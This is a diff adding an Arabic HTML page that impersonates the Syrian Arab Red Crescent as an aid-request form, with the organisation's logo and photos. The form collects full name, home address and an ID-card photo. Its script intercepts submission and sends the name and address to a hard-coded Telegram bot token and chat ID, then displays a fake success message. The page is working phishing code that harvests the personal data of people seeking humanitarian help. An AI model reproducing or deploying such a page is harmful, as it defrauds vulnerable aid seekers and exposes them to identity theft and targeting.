@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>الهلال الأحمر السوري | طلب المساعدات الإنسانية</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+    }
+    header {
+      background-color: #D50000;
+      padding: 20px;
+      color: white;
+      text-align: center;
+      position: relative;
+    }
+    header img {
+      position: absolute;
+      left: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 50px;
+      height: auto;
+    }
+    main {
+      padding: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 80vh;
+      flex-direction: column;
+    }
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 600px;
+      text-align: center;
+    }
+    .form-container h2 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+      text-align: right;
+    }
+    .input-group label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .input-group input,
+    .input-group textarea {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      margin-top: 8px;
+    }
+    .input-group input[type="file"] {
+      padding: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #D50000;
+      border: none;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #C30000;
+    }
+    .footer {
+      text-align: center;
+      background-color: #D50000;
+      color: white;
+      padding: 10px 0;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+    .message {
+      display: none;
+      text-align: center;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+    .success {
+      background-color: #4CAF50;
+      color: white;
+    }
+    .error {
+      background-color: #F44336;
+      color: white;
+    }
+    .images-section {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 40px;
+    }
+    .images-section div {
+      width: 48%;
+      text-align: center;
+    }
+    .images-section img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      transition: transform 0.3s ease;
+    }
+    .images-section img:hover {
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://www.sarc.sy/wp-content/uploads/2020/12/sarc_logo.png" alt="الهلال الأحمر السوري">
+    <h1>الهلال الأحمر السوري</h1>
+    <p>طلب المساعدات الإنسانية</p>
+  </header>
+
+  <main>
+    <div class="form-container">
+      <h2>تسجيل طلب مساعدات</h2>
+      <form id="aidForm" action="submit_form.php" method="POST">
+        <div class="input-group">
+          <label for="fullName">الاسم الثلاثي</label>
+          <input type="text" id="fullName" name="fullName" required>
+        </div>
+
+        <div class="input-group">
+          <label for="address">عنوان السكن</label>
+          <textarea id="address" name="address" rows="4" required></textarea>
+        </div>
+
+        <div class="input-group">
+          <label for="idCard">صورة الهوية الشخصية</label>
+          <input type="file" id="idCard" name="idCard" required>
+        </div>
+
+        <button type="submit">إرسال الطلب</button>
+
+        <!-- تفاعل الرسائل للمستخدم -->
+        <div id="message" class="message"></div>
+      </form>
+    </div>
+
+    <div class="images-section">
+      <div>
+        <img src="https://www.sarc.sy/wp-content/uploads/2020/12/05-1-750x500.jpg" alt="توزيع مساعدات">
+        <p>توزيع المساعدات الغذائية للمحتاجين</p>
+      </div>
+      <div>
+        <img src="https://www.sarc.sy/wp-content/uploads/2020/12/03.jpg" alt="فريق الهلال الأحمر">
+        <p>فريق الهلال الأحمر السوري في العمل</p>
+      </div>
+    </div>
+  </main>
+
+  <div class="footer">
+    <p>حقوق الطبع والنشر محفوظة لدى مازن الدج &copy; 2025</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('aidForm');
+    const messageDiv = document.getElementById('message');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const fullName = document.getElementById('fullName').value;
+      const address = document.getElementById('address').value;
+
+      const token = '8280246518:AAGuE11ny1-zdpkTugVfbJBDk60k6Dkmn6c';
+      const chatId = '5946998458';
+      const message = `اسم المستخدم: ${fullName}\nعنوان السكن: ${address}`;
+
+      const telegramAPI = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramAPI)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            messageDiv.textContent = 'تم إرسال الطلب بنجاح!';
+            messageDiv.className = 'message success';
+            messageDiv.style.display = 'block';
+            form.reset();
+          } else {
+            messageDiv.textContent = 'حدث خطأ أثناء إرسال الطلب!';
+            messageDiv.className = 'message error';
+            messageDiv.style.display = 'block';
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          messageDiv.textContent = 'حدث خطأ أثناء إرسال الطلب!';
+          messageDiv.className = 'message error';
+          messageDiv.style.display = 'block';
+        });
+    });
+  </script>
+
+</body>
+</html>
